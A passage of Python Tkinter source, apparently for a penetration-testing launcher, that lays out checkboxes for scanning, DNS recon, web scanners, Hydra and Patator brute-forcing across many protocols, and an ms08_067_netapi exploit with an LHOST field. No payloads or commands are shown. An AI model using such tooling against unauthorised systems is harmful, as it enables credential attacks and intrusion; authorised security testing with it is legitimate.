C= Checkbutton(root, text = "Netdiscover" ,			  variable = NetdiscoverVar,  onvalue = 1, offvalue = 0).grid(row = 7,  column = 1, sticky=W)
C= Checkbutton(root, text = "ping",                   variable = PingVar,         onvalue = 1, offvalue = 0).grid(row = 8,  column = 1, sticky=W)
C= Checkbutton(root, text = "Nmap",                   variable = nmapVar,         onvalue = 1, offvalue = 0).grid(row = 9,  column = 1, sticky=W)
C= Checkbutton(root, text = "EXTEND",                 variable = extVar,          onvalue = 1, offvalue = 0).grid(row = 10,  column = 1, sticky=W)

TargetLabel = Label (root , text = "Mapping-Scanning",font ="Helvetica 14 underline").grid(row = 11 , column = 1, sticky=W)

C= Checkbutton(root, text = "Traceroute",             variable = TracerouteVar,   onvalue = 1, offvalue = 0).grid(row = 12,  column = 1, sticky=W)
C= Checkbutton(root, text = "Nmap -A",           variable = PortScanningVar, onvalue = 1, offvalue = 0).grid(row = 13,  column = 1, sticky=W)
C= Checkbutton(root, text = "Enum4linux",             variable = Enum4linuxVar,      onvalue = 1, offvalue = 0).grid(row = 14,  column = 1, sticky=W)
C= Checkbutton(root, text = "Sslscan"   ,             variable = SslscanVar   ,   onvalue = 1, offvalue = 0).grid(row = 15,  column = 1, sticky=W)
C= Checkbutton(root, text = "HeartBleed",             variable = HeartbleedVar,   onvalue = 1, offvalue = 0).grid(row = 16,  column = 1, sticky=W)
C= Checkbutton(root, text = "Ike-scan  ",             variable = IkescanVar,      onvalue = 1, offvalue = 0).grid(row = 18,  column = 1, sticky=W)
C= Checkbutton(root, text = "EXTEND ",                variable = extVar,      onvalue = 1, offvalue = 0).grid(row = 19,  column = 1, sticky=W)

TargetLabel = Label (root , text = "DNS-Info",font = "Helvetica 14 underline").grid(row = 5 , column = 2, sticky=W)

C = Checkbutton(root, text = "Whois",   variable = WhoisVar,        onvalue = 1, offvalue = 0 ).grid(row =7 , column =2, sticky=W)
C = Checkbutton(root, text = "dnsmap",variable = dnsmapVar,     onvalue = 1, offvalue = 0 ).grid(row =8 , column =2, sticky=W)
C = Checkbutton(root, text = "Dig",     variable = DigVar,          onvalue = 1, offvalue = 0 ).grid(row =9 , column =2, sticky=W)
C = Checkbutton(root, text = "DNSenum", variable = DNSenumVar,      onvalue = 1, offvalue = 0 ).grid(row =10, column =2, sticky=W)
C = Checkbutton(root, text = "Fierce",  variable = FierceVar,       onvalue = 1, offvalue = 0 ).grid(row =11, column =2, sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable= extVar,			onvalue = 1, offvalue = 0 ).grid(row =12, column =2, sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =13, column =2, sticky=W)

TargetLabel = Label (root , text = "Information Gathering",font = "Helvetica 14 underline").grid(row = 15 , column = 2, sticky=W)

C = Checkbutton(root, text = "Theharvester", variable = TheharvesterVar,  onvalue = 1, offvalue = 0).grid(row =16, column =2, sticky=W)
C = Checkbutton(root, text = "Metagoofil",   variable = MetagoofilVar, onvalue = 1, offvalue = 0).grid(row =17 ,column = 2 ,sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =18, column =2, sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =19, column =2, sticky=W)

TargetLabel = Label (root , text = "Simple Web" ,font = "Helvetica 14 underline").grid(row = 5 , column = 3, sticky=W)

C= Checkbutton(root, text = "WIG",               variable = WigVar,          onvalue = 1, offvalue = 0).grid(row = 7 , column = 3, sticky=W)
C= Checkbutton(root, text = "lbd",               variable = LbdVar,          onvalue = 1, offvalue = 0).grid(row = 8,  column = 3, sticky=W)
C= Checkbutton(root, text = "Wafw00f",           variable = Wafw00fVar,      onvalue = 1, offvalue = 0).grid(row = 9,  column = 3, sticky=W)
C= Checkbutton(root, text = "Joomscan",          variable = JoomscanVar,     onvalue = 1, offvalue = 0).grid(row = 10 ,column = 3, sticky=W)
C= Checkbutton(root, text = "Wpscan",			 variable = WpscanVar, onvalue = 1, offvalue = 0).grid(row = 11 ,column = 3, sticky=W)
C= Checkbutton(root, text = "Dirb",		         variable = DirbVar,		 onvalue = 1, offvalue = 0).grid(row = 12 ,column = 3, sticky=W)
C= Checkbutton(root, text = "Httrack",		     variable = HttrackVar,		 onvalue = 1, offvalue = 0).grid(row = 13 ,column = 3, sticky=W)

TargetLabel = Label (root , text = "Web App Scanners",font = "Helvetica 14 underline").grid(row = 14 , column = 3, sticky=W)

Arachni    = Checkbutton(root, text = "Arachni",    variable = ArachniVar,    onvalue = 1, offvalue = 0).grid(row = 15 , column = 3, sticky=W)
Nikto      = Checkbutton(root, text = "Nikto",      variable = NiktoVar,      onvalue = 1, offvalue = 0).grid(row = 16, column = 3, sticky=W)
Skipfish   = Checkbutton(root, text = "Skipfish",   variable = SkipfishVar,   onvalue = 1, offvalue = 0).grid(row = 17, column = 3, sticky=W)
Uniscan    = Checkbutton(root, text = "Uniscan",    variable = UniscanVar,    onvalue = 1, offvalue = 0).grid(row = 18, column = 3, sticky=W)
w3af       = Checkbutton(root, text = "EXTEND",       variable = extVar,      onvalue = 1, offvalue = 0).grid(row = 19, column = 3, sticky=W)

TargetLabel = Label (root , text = "Password Cracking" ,font ="Helvetica 14 underline").grid(row = 5 , column = 4, sticky=W)

C= Checkbutton(root, text = "Patator",             variable =PatatorVar,   onvalue = 1, offvalue = 0).grid(row = 7,  column = 4, sticky=W)
option = OptionMenu(root, PatatorVar2, " ssh_login ", " ftp_login ").grid(row =7 , column =5)

C= Checkbutton(root, text = "Hydra",             variable =HydraVar,   onvalue = 1, offvalue = 0).grid(row =8 ,  column = 4, sticky=W)
option = OptionMenu(root, HydraVar2, " ssh "," afp", " cisco", " cisco-enable", " cvs", " firebird", " ftp", " http-get", " http-form-post", " http-head", " http-proxy", " https-get", " https-get", " https-form-get", " https-form-post", " icq", " imap", " imap-ntlm", " ldap2", " ldap3", " mssql", " mysql", " ncp", " nntp", " oracle-lintener", " pcanywhere", " pcnfs", " pop3", " pop3-ntlm", " postgres", " rexec", " rlogin", " rsh", " sapr3", " sip", " smb", " smbnt", " smtp-auth", " smtp-auth-ntlm", " snmp", " socks5", " ssh2", " svn", " teamspeak", " telnet", " vmauthd", " vnc").grid(row =8 , column =5)

TargetLabel = Label (root , text = "Exploit" ,font ="Helvetica 14 underline").grid(row = 17 , column = 4, sticky=W)
TargetEntry = Entry (root, textvariable = lhost , width = 30).grid(row = 18 , column = 4,sticky=W )
C= Checkbutton(root, text = "ms08_067_netapi",             variable =ms08Var,   onvalue = 1, offvalue = 0).grid(row =19 ,  column = 4, sticky=W)


C = Checkbutton(root, text = "EXTEND",  variable = extVar ,     onvalue = 1, offvalue = 0).grid(row = 10 , column = 4 ,sticky=W)
#C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =13, column =2, sticky=W)
#C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =13, column =2, sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =11, column =4, sticky=W)
C = Checkbutton(root, text = "EXTEND",  variable = extVar,          onvalue = 1, offvalue = 0 ).grid(row =12, column =4, sticky=W)

def Usernames():	
	username.set(askopenfilename(parent=root, initialdir='/root/Desktop'))

def Passwords():
	password.set(askopenfilename(parent=root , initialdir='/root/Desktop'))

addLog= Button(root, text="Select username file", command=Usernames).grid(row = 7 , column = 6, )
l = Label(root, textvariable= username).grid (row =7 , column =7)
addLog= Button(root, text="Select password file", command=Passwords).grid(row = 8 , column = 6, )
l = Label(root, textvariable= password).grid (row =8 , column = 7)

addLog= Button(root, text="==Start==", command=Start , height=3,  bg = 'red' ,   width = 60).grid(row=24, column=1, rowspan=4, columnspan=5)
addLog= Button(root, text="Clear Buttons", command=ClearButtons).grid(row = 2 , column = 6)
addLog= Button(root, text="Web Config", command=SaveConfig).grid(row = 3 , column = 6)

C= Checkbutton(root, text = "Create packet capture file ",     variable =pcapVar,       onvalue = 1, offvalue = 0).grid(row = 2,  column = 3, sticky=W)
C= Checkbutton(root, text = "Display Results In Terminal",     variable =TerminalVar,   onvalue = 1, offvalue = 0).grid(row = 3,  column = 3, sticky=W)
C= Checkbutton(root, text = "Create html Report",              variable =ParallelVar,   onvalue = 1, offvalue = 0).grid(row = 4,  column = 3, sticky=W)

root.config(menu=menubar)
root.mainloop()
